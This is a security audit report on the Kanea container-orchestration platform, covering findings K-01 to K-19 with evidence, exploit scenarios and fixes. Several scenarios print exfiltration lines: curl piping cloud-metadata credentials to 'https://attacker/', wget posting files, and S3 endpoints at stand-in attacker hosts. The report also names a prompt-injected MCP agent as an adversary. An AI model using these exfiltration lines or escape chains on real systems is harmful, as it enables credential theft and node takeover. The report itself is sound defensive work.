# Kanea: Security Audit Report

**Date:** 2026-08-16
**Scope:** Full codebase review of the Kanea container-orchestration platform (Go, single binary: `kanead` control plane, `kanea-edge` ingress, containerd runtime, internal eBPF datapath, GitOps/build pipeline, backup/replication, MCP server, dashboard, API/WS surfaces).
**Method:** Seven parallel domain reviews (auth/API, edge proxy, workload isolation & spec validation, secrets/crypto/backup, GitOps/builds/supply chain, eBPF datapath & DNS, MCP/dashboard/websocket), followed by independent re-verification of every Critical/High/Medium finding against the source, including upstream sources where behavior is load-bearing (moby/buildkit v0.32.0, containerd v2.3.3). Documented deliberate decisions in `AGENTS.md` / `docs/THREAT_MODEL.md` were treated as out of scope and are **not** reported as findings.
**Headline:** 1 Critical, 7 High, 12 Medium, 32 Low, 5 informational. The platform's documented security posture is unusually thorough and mostly honest, but several of its load-bearing claims do not hold as built, and the most dangerous gaps sit exactly on the boundaries the design documents draw (project isolation, edge/process split, bundle verification, R5 secret scoping).

---

## Executive summary

Kanea's security engineering is strong in breadth: deny-by-default routing, constant-time comparisons, a centralized event vocabulary, fail-closed datapath attach order, per-project webhook HMACs, write-only secrets, a structurally unprivileged MCP layer, and an honest threat model. The audit's "checked, OK" lists are long (see §5).

The serious findings cluster around **validation that exists in one layer but not the layer that matters**:

- The HCL parser (`jobspec`) enforces DNS-1123 names, R5 secret scoping, capability allowlists and build-block sanity, but the raw JSON apply route (`PUT /v1/services`), the storage block, and the build runner do not re-enforce them, and the threat model explicitly treats GitOps-pushed content and stolen/plantable credentials as in-scope adversaries.
- The build pipeline hands repo-controlled paths to a root `buildctl` with a purely lexical containment check; one committed symlink converts "push access to one repo" into arbitrary root file reads with built-in exfiltration channels.
- The shipped `kanea-edge` systemd unit runs as uid 0, voiding the process-split boundary the threat model calls boundary 2.
- "Default seccomp profile" is claimed in five documents and applied nowhere.
- Offline-bundle image verification compares a *name*, not a digest: a forged bundle installs host binaries that later run as root.

None of these require exotic exploitation. Each has a small, local fix consistent with patterns the codebase already uses (duplicated plan/apply checks, `EvalSymlinks` at composition points, trust checks at file loads).

---

## Findings summary

| ID | Severity | Finding | Primary area |
|----|----------|---------|--------------|
| K-01 | **Critical** | Build-context symlink escape: repo push → arbitrary root file read with exfiltration via build steps / parse errors / notifications | gitops/build |
| K-02 | **High** | `kanea-edge` ships running as uid 0: the documented process-split boundary is void | packaging/systemd |
| K-03 | **High** | `storage.auth_ref` has no R5 scope check and `endpoint` is unchecked → cross-project credential exfiltration via GitOps push | jobspec/storage |
| K-04 | **High** | `PUT /v1/services` accepts unvalidated project/service/volume names that compose into root filesystem operations | api/reconciler |
| K-05 | **High** | Offline-bundle image check is a name lookup, not a digest comparison → forged bundle installs host binaries run later as root | provision |
| K-06 | **High** | "Default seccomp profile" is documented everywhere and applied nowhere | runtime |
| K-07 | **High** | Builds run with `--net=host` + `--oci-worker-no-process-sandbox`: push access reaches cloud metadata, loopback diagnostics, and every project's VIPs; undocumented | gitops/build |
| K-08 | **High** | Backup manifest and segment inventory are unauthenticated → bucket-write attacker rolls restores back, defeating revocation | backup |
| K-09 | Medium | Datapath binds source IP to cluster membership, not to the veth → any alloc can forge any in-cluster identity (incl. the host's) for one-way traffic | datapath |
| K-10 | Medium | Health-check `path` enables spec-controlled blind SSRF from `kanead` (URL userinfo injection) | reconciler |
| K-11 | Medium | Slow-body DoS bound is cleared by client-sent `Upgrade` headers | edge |
| K-12 | Medium | UDP published-port relay is an unauthenticated reflection/amplification point | edge |
| K-13 | Medium | Deleting/re-credentialling an account does not revoke its sessions; no revocation surface exists | auth |
| K-14 | Medium | Login limiter state map is unbounded and keyed by attacker-chosen data | auth |
| K-15 | Medium | Build `tag`/`cache_repo`/`target` spliced into buildctl option strings (comma injection → forced plaintext push) | gitops |
| K-16 | Medium | `git.url` userinfo neither refused nor redacted; no scheme allowlist (`http://` sends deploy tokens in cleartext) | gitops |
| K-17 | Medium | `applyServices` does not re-enforce spec invariants the server treats as its own boundary (capabilities, R25 set, auth refs, multi-route auth) | api |
| K-18 | Medium | No per-connection WS subscription cap; empty-target feeds re-scan the alloc bucket on a fixed tick | api/ws |
| K-19 | Medium | Env `secret:` references are never resolved: R3's documented tmpfs injection does not exist | reconciler/jobspec |
| K-20 | Medium | Host-volume allowlist is TOCTOU-vulnerable between `EvalSymlinks` and the bind mount | storage |
| K-21…K-52 | Low | See §4 (32 items) | various |
| I-1…I-5 | Info | See §4.3 | various |

---

## 1. Critical

### K-01: Build-context symlink escape: push access → arbitrary root file read on the node

**Area:** `internal/gitops` (runner, buildkit driver), `internal/provision` (buildkit unit). **Verified end-to-end** against Kanea source and moby/buildkit v0.32.0 (the pinned version in `internal/provision/components.json`).

**Evidence.**

1. The build context is guarded by a purely lexical check; `internal/gitops/runner.go:277-287`, `424-437`:

   ```go
   contextDir = filepath.Join(dir, filepath.FromSlash(strings.TrimPrefix(req.Build.Context, "./")))
   if err := withinDir(dir, contextDir); err != nil { … }
   // withinDir: filepath.Abs + filepath.Rel; no filepath.EvalSymlinks anywhere in internal/gitops
   ```

2. That directory is handed verbatim to `buildctl`, executed by `kanead` **as root**; `internal/gitops/buildkit.go:296-300`: `--local context=<dir>`, `--local dockerfile=<dir>`.
3. buildctl resolves the context root through symlinks; buildkit v0.32.0, `vendor/github.com/tonistiigi/fsutil/fs.go`:

   ```go
   func NewFS(root string) (FS, error) {
       root, err := filepath.EvalSymlinks(root)
   ```

4. The checkout writes symlink blobs verbatim (standard git semantics; go-git/go-billy v5.9.1 `Symlink` stores the target unchanged). A committed blob `ctx` containing `/etc` (or `/var/lib/kanea`) becomes a real symlink on disk.
5. `DetectRecipe` (`buildkit.go:329-343`) uses `os.Stat`, which follows the symlink, so `dockerfile = "shadow"` validates because `/etc/shadow` exists.
6. Exfiltration channels, pick one:
   - **Direct:** the build's own `RUN` step (`COPY . /loot` then `wget --post-file` to the attacker): builds have host networking (K-07), so no credential or API access is needed at all.
   - **No network needed:** buildkit's dockerfile parser error echoes the offending instruction token verbatim (`frontend/dockerfile/instructions/parse.go`: `UnknownInstructionError{Instruction: node.Value}` → `"unknown instruction: %s"`). `/etc/shadow` lines contain no whitespace, so the entire first line (`root:$y$…`) becomes the error string → recorded in `run.Error` → written to the build log (viewer-readable) and embedded in `build.failed` notifications (`internal/gitops/queue.go:169-174`: `message += ": " + run.Error`) delivered to the attacker's webhook channel declared in the same pushed spec.
   - **Registry:** `COPY` the loot into the image and let the normal push deliver it to the project's registry.

**Exploit scenario.** Attacker can push to any GitOps-synced repository (THREAT_MODEL §3.8's assumed adversary: "owns that project's services"). Push: symlink `ctx -> /var/lib/kanea`, plus a spec with `build { context = "ctx" }` and a Containerfile that `COPY`s `master.key` and exfiltrates it in a `RUN` step. Within one poll interval the node clones, builds, and the attacker holds **the master key**; threat-model asset #1: every stored secret and every encrypted backup. Root hash (`/etc/shadow`), TLS private keys, and any other root-readable file are equally reachable.

**Impact.** "Write access to one project's git source" (the boundary the entire project-isolation design (PRD v1.23, §3.8, §3.12) asserts) becomes a root file read on the node and potential compromise of every project and every backup.

**Remediation.**

1. `withinDir`: compare `filepath.EvalSymlinks` of both paths *and* refuse any symlink at or below the checkout root on the resolved context path (walk components with `Lstat`).
2. `DetectRecipe`: `Lstat` the recipe and refuse symlinks.
3. Add jobspec `validateBuild` refusing absolute/`..` forms of `context`/`dockerfile` at plan (the R23-style duplicated check: plan for the operator, runner for records that arrive another way).
4. Consider having checkout materialization refuse or rebase absolute symlinks in the tree: nothing legitimate consumes them.
5. Regression test in the shape of the existing `TestABuildContextOutsideTheCheckoutIsRefused`, using a symlink instead of `..`.

---

## 2. High

### K-02: `kanea-edge` runs as uid 0; the documented "own user" boundary is not enforced

**Evidence.** `cmd/kanea/units.go:225-265` (`edgeService`) renders `Type=exec`, `AmbientCapabilities=CAP_NET_BIND_SERVICE`, `CapabilityBoundingSet=CAP_NET_BIND_SERVICE`, `NoNewPrivileges=yes`, `ProtectSystem=strict`, and **no `User=`/`Group=` directive**. `kanea init` creates no edge user. But `docs/THREAT_MODEL.md:47` states boundary 2 as `kanea-edge (own user, CAP_NET_BIND_SERVICE only, no Store handle)` and concludes "an edge compromise costs traffic on the names it terminates: it does not cost the cluster" (§1). The projection code is designed around the separate user (`internal/edge/certs.go:115-118`; `--edge-certs-gid`, `cmd/kanea/agent.go:138`), which is why the bundle currently falls back to the 0600 owner-only branch: readable by the edge only because it is uid 0.

**Why uid 0 + no capabilities ≠ a dedicated user.** Linux DAC checks *owner* permissions before capabilities: a process with fsuid 0 matches the owner of every root-owned file without needing `CAP_DAC_OVERRIDE`. Code execution inside the edge can therefore: read `/var/lib/kanea/master.key` (0600 root; every stored secret and every encrypted backup); connect to `/run/kanea/containerd.sock` (0600 root; `AF_UNIX` is in `RestrictAddressFamilies`; the read-only-mount EROFS check in `__inode_permission` excludes `S_ISSOCK`, so `ProtectSystem=strict` is not a barrier); i.e. full node control per §3.12; and signal every uid-0 daemon (same-uid signaling needs no capability), keeping the control plane down in a kill loop.

**Preconditions.** RCE in the edge process (e.g. a memory-safety bug in the HTTP/2 or x509 stack parsing untrusted input). Hard, but it is precisely the adversary the §5.2.6 process split exists to bound.

**Remediation.** Create a `kanea-edge` user/group in `kanea init`; add `User=kanea-edge`/`Group=kanea-edge` to `edgeService`; render `--edge-certs-gid kanea-edge` into the kanead unit so the existing 0640 group-read bundle path is exercised. Add a `units_test.go` assertion (next to the existing capability checks) so the directive cannot be dropped silently.

---

### K-03: `storage.auth_ref` has no R5 scope check; `endpoint` is unchecked → cross-project credential exfiltration

**Evidence.** Every other credential reference in jobspec is scope-checked (`validateGit`, `validateSecretRefs`, `checkSecretRef`). The storage block is not: `internal/jobspec/validate.go:334-420` (`validateStorages`) checks only driver-field presence; no `checkSecretRef(st.AuthRef, …)`, no `endpoint` validation at all. Resolution is unscoped: `internal/storage/mount.go:204` → `secrets.Store.Resolve` knows no project. `endpoint` is used verbatim as s3fs `url=` (`mount.go:130`) and mountpoint-s3 `--endpoint-url` (`mount.go:175`). The GitOps boundary does not catch it: `parseCheckout` refuses foreign projects/services; storage blocks are top-level and unchecked.

**Exploit scenario.** Push access to a synced repo. Push a spec declaring `storage "loot" { type="s3" bucket="probe" endpoint="http://attacker.example:8080" auth_ref="secret:bank/aws-creds" }` and a service mounting it. At alloc start, kanead resolves **another project's** secret, writes it to a 0600 file, and runs the mount helper against the attacker's server, which receives the SigV4 `Authorization` header carrying bank's AWS access key, on every mount retry. The SMB variant hands the attacker an NTLMv2 challenge response. Even *same-project* this escalates: a repo pusher can reference `secret:shop/x` but can never read it (write-only API); the endpoint redirect lets them *learn the raw credential*, portable off-node access the write-only design exists to prevent. PRD v1.22 explicitly claims "git, registry, storage, and notification credentials follow the same scoping": storage does not.

**Remediation.** (a) Scope-check `auth_ref`: validate at `validateVolumes` time that every service mounting the storage may read the ref (`scope == svc.Project || scope == shared`), mirroring R5. (b) Validate `endpoint`: require `https://` (mirror `validateNotifyURL`), parse as URL; consider the egress-guard posture for storage endpoints. (c) Refuse non-`secret:` `auth_ref` shapes at plan.

---

### K-04: `PUT /v1/services` accepts unvalidated names that compose into root filesystem operations

**Evidence.** The only DNS-1123 enforcement lives in the HCL parser (`internal/jobspec/validate.go:22-26`). The JSON apply path validates only non-emptiness (`internal/api/server.go:818-822`); `ApplyRequest.Pipelines[].Project` is likewise unchecked. Those names compose host paths used by kanead **as root**, every reconcile pass:

- **resolv.conf write**: `reconciler.create()` → `network.WriteResolvConf` → `filepath.Join(dir, project+".resolv.conf")` (`internal/network/resolv.go:63`), written 0644 as root; its `validateLabelValue` (`internal/network/types.go:166-174`) refuses `=:;, \t\n` but **not `/` or `..`**. → arbitrary-path file write as root (suffix `.resolv.conf`, partially controlled content).
- **Volume mkdir/chown/chmod**: `ensureVolumes` (`internal/reconciler/reconcile.go:1058-1070`): `os.MkdirAll(path, 0o750)` then `applyOwnership` (chown/chmod with record-controlled uid/gid/mode) over `VolumeHostPath(volumeDir, project, service, index, volume)` (`reconciler/plan.go:445-457`). `filepath.Join` cleans `..`, so any absolute path is reachable. A two-stage chain (plant a symlink via a legitimate volume, then traverse through it) mounts arbitrary existing host directories into an attacker-imaged container.
- **Log read**: an alloc record with a traversal ID is listed by `/v1/allocs`, and `GET /v1/logs?alloc=…` / the WS log feed open `filepath.Join(logDir, alloc.ID+".log")` → root-privileged read of any `*-<n>.log` file, streamed to any viewer. (The log *write* side is unreachable: containerd's `identifiers.Validate` rejects `/`.)

`internal/reconciler/types.go:799-804` states the false assumption: "Project and service are DNS-1123 labels (jobspec R1), so the result is safe"; true only for records that passed through jobspec. Records persist and retry every pass, so the effects re-apply until an admin deletes the record: surviving revocation of the token that created them.

**Preconditions.** An admin credential (stolen token, compromised CI). Kanea's own design says an API admin is **not** host-root-equivalent (that is the premise of the passthrough/grant system (R17/R18, §3.12)) so this crosses a documented boundary.

**Remediation.** Validate `Project`/`Service`/`Pipelines[].Project` (and nested volume/storage names) as DNS-1123 labels in `applyServices` before any Store write (export jobspec's check or duplicate it deliberately: the `CapabilityNone` precedent). Defense in depth: make `AllocID`, `VolumeHostPath`, `WriteResolvConf` and the log-path joins assert the cleaned result stays under its base directory. Regression test: traversal-named apply is refused.

---

### K-05: Offline-bundle image verification is a name lookup, not a digest comparison

**Evidence.** `internal/provision/image.go:74-83`:

```go
if _, err := c.client.GetImage(ctx, ref); err == nil {
    c.log.Debug("image already present", "ref", ref)
    return nil
}
```

`ref` is `image@sha256:<pinned>`, but `GetImage` is a **name lookup**: it never compares the image's target digest to the digest embedded in the name. The bundle path imports first (`cmd/kanea/install.go:293-303` → `ImageClient.Import`), and containerd v2.3.3's `Import` creates the image record with the name taken **verbatim from the archive's annotation** (`client/import.go`: `name := imageName(m.Annotations, …)`, `Target: m`; the attacker-controlled manifest descriptor; verified against upstream source). Nothing checks that a record named `…@sha256:D` targets digest `D`. `Unpack` then extracts `buildkitd`/`buildctl`/`rootlesskit` from that target to `/usr/local/lib/kanea/bin/`, 0755, root-owned. The comment at `image.go:143-147` asserts the opposite of what the code does. The install receipt records the *pinned* digest regardless, so `kanea doctor` stays green. The online path is safe (the resolver fetches by digest); the airgapped CI tamper test covers only artefact kinds, not the image path.

**Exploit scenario.** Operator installs from a bundle tampered after download (USB transit, re-uploaded mirror, shared build host: release checksums/cosign cover only the official channel). The crafted `images/buildkit.oci.tar` carries index annotation `org.opencontainers.image.ref.name = "docker.io/moby/buildkit@sha256:<pinned>"` and self-consistent malicious layers. `kanea install --bundle` imports it; `Fetch` finds the name and returns; `Unpack` plants the binaries. Next build: kanead execs the attacker's `buildctl` **as root**.

**Impact.** Root code execution on the node, persistent, invisible to `doctor`. Contradicts the documented invariant "a bundle is not trusted more than the network: verified against the hashes in the installing node's binary" (§3.11).

**Remediation.** In `Fetch`, when `GetImage` succeeds, require `img.Target().Digest` to equal the manifest-pinned digest; fail loudly on mismatch. Repeat the comparison post-`Import`. Extend the airgapped CI tamper test to the image component.

---

### K-06: "Default seccomp profile" is documented everywhere and applied nowhere

**Evidence.** `internal/runtime/doc.go:5`: "Workload hardening defaults are applied here (drop caps, no-new-privileges, **seccomp**; PRD §5.2.4, §14 A05)." The same claim is in AGENTS.md binding constraint #6, PRD §14 A05, PRD §20 M5's exit criterion, and THREAT_MODEL §3.5. `withHardening` (`internal/runtime/spec.go:138-218`) sets capabilities, NNP, user, namespaces, masked/readonly paths, and never touches `s.Linux.Seccomp`. A repo-wide grep for `[Ss]eccomp` finds only the doc comment; no test asserts a profile. containerd's default spec does not supply one either (`containerd/v2@v2.3.3/pkg/oci/spec.go` builds no `Seccomp` field; the only seccomp SpecOpt in the module is `WithSeccompUnconfined`). With `Linux.Seccomp == nil`, runc installs no syscall filter: **every runc alloc runs seccomp-unconfined**.

**Impact.** The syscall surface Docker's default profile would block (`keyctl`, `bpf`, `perf_event_open`, `userfaultfd`, `io_uring`, `kexec_load`, …) is reachable from any compromised workload, gated only by capabilities and namespaces. The R13 baseline caps block the worst of it, so marginal exposure is moderate, but this contradicts a **binding constraint** and a milestone exit criterion, and the M5 "hardening audit" claim is false as built.

**Remediation.** Set a default profile in `withHardening` (vendor Moby's default profile or containerd-CRI's) via `s.Linux.Seccomp`; add a `spec_test.go` assertion that the profile is present with a sane default action. (Amending the documents to drop the claim is the worse option.)

---

### K-07: Builds execute repo-controlled code with host networking and no process sandbox; the egress guard does not apply; undocumented

**Evidence.** `internal/provision/units.go:207-214`: rootlesskit `--net=host` + buildkitd `--oci-worker-no-process-sandbox`. Every Dockerfile `RUN` step executes in the **host network namespace**. The §14 A10 egress block (`169.254.0.0/16`) is implemented by tc programs attached to **alloc veths**; build traffic originates in the host netns, so nothing stands between a build and:

- **Cloud instance metadata** (`169.254.169.254`, `fd00:ec2::254` on AWS) → instance credentials on IMDSv1 nodes.
- **Unauthenticated loopback listeners**: containerd metrics `127.0.0.1:1338`, edge status `127.0.0.1:8601` (`/routes`, `/certs`, `/metrics`), internal DNS.
- **Every workload VIP cross-project**: the connect-time LB is a root-cgroup hook and the policy layer passes sources outside the cluster CIDR by construction; build traffic (source = the node's own address) is load-balanced and admitted everywhere, the exact cross-project reachability the datapath is documented to deny workloads.
- (kanead/containerd unix sockets are *not* reachable (different mount namespace, `/run/kanea` 0710 root:root) verified.)

`docs/THREAT_MODEL.md` has **no section on builds**: the adversary table grants "malicious job spec" only "the HCL parser, the scheduler". The M0 spike note ("`--net=host` keeps a node-local registry reachable") is the only documented rationale.

**Exploit scenario.** Push access to a synced repo: `RUN curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/… | curl -X POST -d @- https://attacker/` on any cloud node; `RUN curl -s 127.0.0.1:8601/routes` and `RUN curl -s http://<other-project-VIP>/` on any node.

**Remediation.** Document the build threat model explicitly (THREAT_MODEL §3.x: "a build is arbitrary code execution by whoever can push, with host networking"). Enforce: an nftables/eBPF egress rule keyed on the buildkit cgroup or the `kanea-buildkit` uid dropping `169.254.0.0/16` (mirroring the alloc guard); evaluate a worker network namespace with NAT + explicit registry allow instead of `--net=host` (rootlesskit supports slirp4netns with host reachability via `10.0.2.2`).

---

### K-08: Backup manifest and segment inventory are unauthenticated → rollback/ resurrection attacks on restore

**Evidence.** `internal/backup/archive.go:44-70`: the `Manifest` is plain JSON; no MAC anywhere in `internal/backup` (grep-verified). `Fetch` (`archive.go:398-431`) checks `m.KeyID` (skippable when empty) and verifies the snapshot against `m.Snapshot.SHA256`: **both name and expected hash come from the same unauthenticated manifest**. `Restore` (`restore.go:57-101`) replays only segments with `To > manifest.Index`: attacker-controlled. `Latest` picks by `CreatedAt`: attacker-controlled. The restore log line prints `manifest.ID/CreatedAt/Index/Node`: all forgeable, so the "operator reads the log" tripwire is forgeable. `replay` (`restore.go:105-148`) iterates whatever segments the bucket listing contains with **no contiguity check**: the stated invariant covers only *unreadable* segments; a segment *deleted from the bucket* is silently absent, and AGENTS.md itself states the consequence: "skipping one resurrects whatever a delete in it removed, and the reconciler starts it."

**Exploit scenario.** Write access to the backup bucket: the adversary `crypto.go:19-21` declares in scope ("the bucket is assumed hostile"). The attacker copies an older archive's manifest over the newest (the old snapshot is genuine ciphertext under the same key, so AEAD and the SHA-256 check both pass), sets `Index` to the current high-water mark (readable from segment object names), and waits for a restore. The node comes up on stale state: **revoked tokens, deleted accounts and deleted secrets resurrect**; deleted services are restarted by the reconciler. Alternatively: delete the newest segments (suppress recent mutations) or one middle segment (selective resurrection of deletes), undetected.

This is not the documented "no signed archives" decision: that covers *attribution*. A keyed MAC attributes nothing, and the documented rationale ("archives are AEAD-authenticated and hashed, so tampering is detected on read") is only true of the snapshot object; substitution of a *consistent* old (manifest, snapshot) pair is not tampering these checks can see.

**Remediation.** Derive a third HKDF key (`"kanea backup manifest mac v1"`) in `DeriveKeys`; HMAC-SHA256 the canonical manifest bytes, store the tag in the manifest, verify in `Fetch`/`Restore` before trusting any field (including `KeyID`). In `replay`, refuse when the segment set above the snapshot index does not chain contiguously (`next.From == prev.To + 1`). `kanea backup verify` keeps its keyless mode for bit-rot and reports "manifest authenticity unverifiable without the key" when the key is absent.

---

## 3. Medium

### K-09: Datapath: source IP is bound to cluster membership, not to the veth

`internal/datapath/bpf/kanea.c:849-866` (and the v6 twin): the egress anti-spoof check verifies only that the source is *inside the cluster CIDR*, never that it equals the address kanead assigned to this veth. Policy at the destination is then evaluated on the *claimed* source identity (`kanea.c:678-711`), including an `IDENTITY_FLAG_HOST` pass *before* any protocol gating. No capability is needed to forge: `IP_FREEBIND` + `bind()` + `sendto()` (the code comment itself acknowledges IP_FREEBIND needs no capability but doesn't follow through for in-cluster sources). Target addresses are free: the embedded DNS publishes per-alloc IPs to any querier, and the host anchor (`.1`, the one `IDENTITY_FLAG_HOST` address) is every alloc's nameserver. Consequences: cross-project UDP/ICMP delivery (otherwise denied outright) and one-way delivery of *any* protocol to *any* alloc as the *host* identity, bypassing `allow_v4`. TCP handshakes don't complete (replies return to the real owner), so this is one-way, but §3.5's stated weakening is "can learn that an address exists, **not talk to it**", and §4 claims "no route to another project's services"; both are false under source forgery. **Remediation:** add a pinned `veth_src` hash map keyed by `skb->ingress_ifindex` → address (plus a v6 twin, respecting the additive-map ABI rule), written in `plumb()` before link-up, deleted in `Detach`; drop with `DROP_SPOOF` on mismatch. If deliberately not fixed, write the residual into THREAT_MODEL §3.5 and qualify §4 to "no two-way route".

### K-10: Health-check `path` → blind SSRF from kanead (URL userinfo injection)

`internal/reconciler/health.go:141-147`: `url := "http://" + net.JoinHostPort(target.IPv4, …) + path` with `check.Path` validated only for non-emptiness (`internal/jobspec/validate.go:692-697`). `path = "@169.254.169.254/latest/meta-data"` makes Go parse the alloc's address as userinfo and dial the attacker-chosen host (verified: `URL.Host` becomes `169.254.169.254`). Anyone who can land a spec makes **kanead**: the control plane; GET an arbitrary address (metadata service, the node's own API listener, LAN services); the 2xx/other verdict is observable through alloc health and `service.healthy/unhealthy` events; a scanning oracle and an unauthenticated-GET side-effect primitive. §14 A10's egress drop filters workload traffic, not kanead's. **Remediation:** validate `health_check.path` at plan (must start with `/`, no `@`, `?`, `#`, whitespace: mirror `validateTriggerPath`), and/or build the URL and assert `req.URL.Host` equals the intended `host:port` before dialing (the stronger check).

### K-11: Slow-body DoS bound is bypassed by client-sent `Upgrade` headers

`internal/edge/proxy.go:589-604`: `if isUpgrade(r) || grpcStream || r.ContentLength == 0 || p.bodyTimeout <= 0 { deadline = time.Time{} }`; `isUpgrade` is computed purely from client-controlled headers. It is the *only* body bound (no `ReadTimeout` by design), and Go's post-handler background body-consume also runs undeadlined. `POST /` with `Connection: upgrade`, `Upgrade: websocket`, `Content-Length: 1000000000`, then dribble a byte per minute: the connection is held forever at near-zero cost; thousands exhaust edge fds/memory and deny ingress for the node. A real WebSocket handshake has no body, so `ContentLength == 0` already clears the deadline for it: the `isUpgrade` exemption only ever fires for upgrade requests *with* bodies, which are exactly the abuse case. **Remediation:** drop `isUpgrade(r)` from the exemption, or keep the deadline for the handshake phase and clear it in `statusRecorder.Hijack` once the upgrade has actually succeeded.

### K-12: UDP published-port relay is an unauthenticated reflection/amplification point

`internal/edge/udp.go`: the first datagram from a source creates a session and is forwarded (`handle`, 183-206); every backend datagram is written to the (possibly spoofed) client address **and refreshes `lastActive`** (`replyLoop`, 293-318), so a streaming backend keeps the session alive indefinitely. No response-size budget, no request/response pairing, no reachability proof. One spoofed datagram to a published UDP port whose backend answers larger (or streams (game-state ticks)) turns the node into a reflector against third parties, from the node's IP, for as long as the backend emits. The same mechanism exhausts the session table (256/listener) with throwaway spoofed sources. THREAT_MODEL §3.13 and PRD v1.42 are silent on spoofing/amplification, so this is not a documented decision. **Remediation:** cap per-session `bytesOut` until the client sends a second datagram from the same socket (weak reachability proof); pair backend datagrams to client requests (at most N replies per client datagram); document the residual reflection exposure in §3.13 and the publish docs.

### K-13: Deleting or re-credentialling an account does not revoke its sessions

`internal/auth/store.go:153-166`: `DeleteUser` deletes only the user record; `Session()` (263-286) resolves the session with no check that the subject still exists, so its embedded `Role` authorizes until the 12 h absolute expiry. Demotion has the same gap. The documented emergency lever ("delete the session records", THREAT_MODEL:861-864) is not operable: no API route or CLI verb lists/deletes sessions (only self-logout). The standard compromised-credential response (`kanea user rm`, password reset) completes successfully and changes nothing for an attacker holding a stolen cookie. **Remediation:** `DeleteUser` (and `PutUser` on password change) deletes `auth/session/*` records for the subject (bounded prefix scan; rare events), or `Session()` verifies the subject account still exists for `MethodSession` sessions; add an operator verb (`DELETE /v1/users/{name}/sessions`).

### K-14: Login limiter state map is unbounded, keyed by attacker-chosen data

`internal/auth/store.go:542-645`: `counts map[string]*attemptState` keyed by `"src:"+source` and `"acct:"+account`, pruned only inside `fail()` for expired entries; no capacity cap. The account half is the raw username (up to the 4 KiB body cap; `checkName` applies only at `PutUser`), and unknown names still create entries (deliberately memory-only). Every sibling structure with attacker-chosen keys has an explicit cap (`ratelimit.DefaultCapacity = 1<<16` LRU; webhook replay cache 4096): the login limiter is the exception. Unauthenticated remote memory exhaustion: ~5 attempts per source per window × ~4 KiB names × botnet-scale distinct sources → kanead heap growth until OOM (control plane down; workloads keep running). **Remediation:** truncate/hash the account key before it enters the map (the limiter doesn't need the plaintext); add an LRU capacity cap mirroring `ratelimit.Limiter`.

### K-15: Build `tag`/`cache_repo`/`target` spliced into buildctl's comma-separated option strings

No `validateBuild` exists in jobspec (grep-verified). `internal/gitops/buildkit.go:291-320`: `output := fmt.Sprintf("type=image,name=%s,push=true", req.Reference())`, `"type=registry,ref=" + req.CacheRepo + ",mode=max"`. `ExpandTag` sanitizes only the `${GIT_BRANCH}` substitution: a literal `tag = "x,registry.insecure=true"` from a pushed spec appends an insecure-registry override even when the operator never enabled insecure mode → buildkitd pushes over plaintext HTTP → a network attacker sees the project's registry credentials (Basic auth) and image stream. Duplicate `name=` keys resolve last-wins toward a registry the operator did not choose. **Remediation:** validate `target`/`cache_repo` as image references at plan (`distribution/reference` is already a dependency); reject `,`, `=`, whitespace in `tag`; duplicate the checks in the runner (the `ownershipRefusedBy` precedent).

### K-16: `git.url` userinfo neither refused nor redacted; no scheme allowlist

`validateGit` (`internal/jobspec/validate.go:113-172`) checks only non-emptiness and ref shapes: nothing rejects `https://oauth2:glpat-…@gitlab.example.com/…`, and the URL is written into build logs (`runner.go:249`) and every sync/clone error (`git.go:178,243,398-405`), which propagate to `run.Error`, the sync API, and daemon logs; readable by any **viewer**. `audit.Redact` has no URL-userinfo pattern. Separately, nothing inspects the scheme: for `http://` remotes go-git sends the resolved deploy token as cleartext BasicAuth; `git://` is unauthenticated plaintext, MitM-able into push-equivalent content control. (SSH is fine: go-git fails closed without a known_hosts DB; worth a `doctor` check/docs note.) **Remediation:** refuse userinfo in `git.url` at plan with a diagnostic pointing at `auth_ref`; strip userinfo at every log/error call site (the `notify.redactURL` pattern exists); refuse schemes outside `https`/`ssh`/scp-form, or gate `http://` behind an explicit daemon opt-in that never sends credentials.

### K-17: `applyServices` does not re-enforce spec invariants the server treats as its own boundary

`internal/api/server.go:811-880` re-checks the R22 port policy, the closed runtime set, and the wasm exec-probe refusal, and nothing else. Consequences, all reachable with an admin credential (including a prompt-injected MCP agent holding one; §3.10's named adversary): `"capabilities": ["CAP_SYS_ADMIN"]` is stored verbatim and unioned in by `effectiveCapabilities` (`runtime.Validate` requires only the `CAP_` prefix); inline `Volumes[].Resource{Type:"s3", Endpoint:"http://evil", AuthRef:"secret:bank/x"}` compounds K-03; a record with `Runtime: "io.containerd.wasmtime.v1"` plus volumes/devices/sockets/capabilities/`user`/scaling passes (two of R25's seven refusals are re-checked); and a record whose second route carries weaker/no auth is projected with only the first route's auth (`serviceAuth` takes the first), defeating the v1.50 identical-auth invariant. Notably `POST /v1/spec/apply` *does* validate server-side: the "safe" path currently enforces more than the raw path, the exact inversion of the port-policy comment's own reasoning. **Remediation:** add a `validateDesired(svc)` step in `applyServices` re-running the capability forbidden/permitted check, R5-scope-checking every inline `Resource.AuthRef`, refusing R25's full list when `Runtime != ""`, and requiring identical auth across `AllExposes()`. The dependency direction (api → jobspec) already exists.

### K-18: No per-connection WS subscription cap; empty-target feeds re-scan the alloc bucket every second

`internal/api/ws.go:405-413`: `subscribe` grows `s.subs` without bound; every distinct `topic:project/service` key spawns a permanent goroutine. `feedFor` does not verify the service exists, so fabricated targets start fine; `logFollower.resync` (`feed.go:383-408`) runs `selectAllocs` (a full paginated alloc-bucket scan) on **every** pass when nothing is tailed (throttled only to 1 s per subscription); `feedStats` re-lists allocs every 5 s per stats subscription. Post-upgrade, no rate limit applies to WS frames. One viewer connection + a few thousand small frames ≈ a few thousand goroutines and hundreds of bucket scans per second: sustained CPU/memory pressure on kanead; the daemon-wide 32-connection cap doesn't help (one connection suffices) and is itself shared across users (K-31). **Remediation:** cap subscriptions per connection (the dashboard uses a handful) and refuse excess with an error frame; negative-cache/index-gate the empty-tailer resync; cache the alloc list per store index in `statsFor` (the `feedStoreKind` pattern).

### K-19: Env `secret:` references are never resolved; R3's tmpfs injection does not exist

